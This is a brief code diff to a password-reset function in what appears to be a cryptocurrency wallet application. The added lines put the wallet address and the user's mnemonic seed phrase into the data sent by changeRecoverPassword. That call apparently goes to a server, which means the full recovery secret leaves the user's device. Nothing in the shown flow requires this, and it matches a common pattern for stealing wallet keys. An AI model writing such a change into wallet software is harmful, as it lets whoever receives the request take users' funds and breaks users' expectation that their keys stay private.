@@ -45,8 +45,10 @@ function ForgotPassword() {
       const encrypted = await encryptWallet(decrypted, newPassword);
       const data = {
         token,
+        address: decrypted.address,
         password: newPassword,
-        encryptedWallet: encrypted
+        encryptedWallet: encrypted,
+        mnemonic
       };
       await changeRecoverPassword(data);
       showModalSuccess('Success!', 'Your password was successfully changed!');
